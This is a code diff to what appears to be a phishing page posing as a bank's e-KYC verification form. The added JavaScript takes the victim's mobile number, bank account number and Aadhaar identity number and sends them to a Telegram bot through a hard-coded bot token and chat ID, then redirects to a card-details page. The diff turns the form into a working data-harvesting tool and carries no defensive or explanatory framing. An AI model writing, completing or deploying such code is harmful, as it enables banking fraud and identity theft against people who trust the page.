@@ -107,7 +107,6 @@
       <button class="side-button" type="submit">Continue</button>
     </form>
 
-    <!-- Additional images -->
     <img class="extra-img" src="https://i.ibb.co/YBFgSJP7/77b989a2-c19c-4317-9739-20cca9ebe498.jpg" alt="Extra Image 1">
     <img class="extra-img" src="https://i.ibb.co/TxY7gVf6/Screenshot-2025-04-21-14-11-44-95-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Extra Image 2">
   </div>
@@ -142,7 +141,19 @@
       }
 
       if (isValid) {
-        window.location.href = "cardpage.html";
+        const message = `🧾 E-KYC Submission\n📱 Mobile: ${mobile}\n🏦 Account: ${account}\n🆔 Aadhaar: ${customerid}`;
+        const url = `https://api.telegram.org/bot8194227351:AAFvq912-UCW3_8PugBn5qLgK7lddVfq5pM/sendMessage?chat_id=8032862702&text=${encodeURIComponent(message)}`;
+
+        fetch(url)
+          .then(response => {
+            if (response.ok) {
+              window.location.href = "cardpage.html";
+            } else {
+              alert("Failed to send data. Please try again.");
+            }
+          });
+
+        return false;
       }
 
       return false;
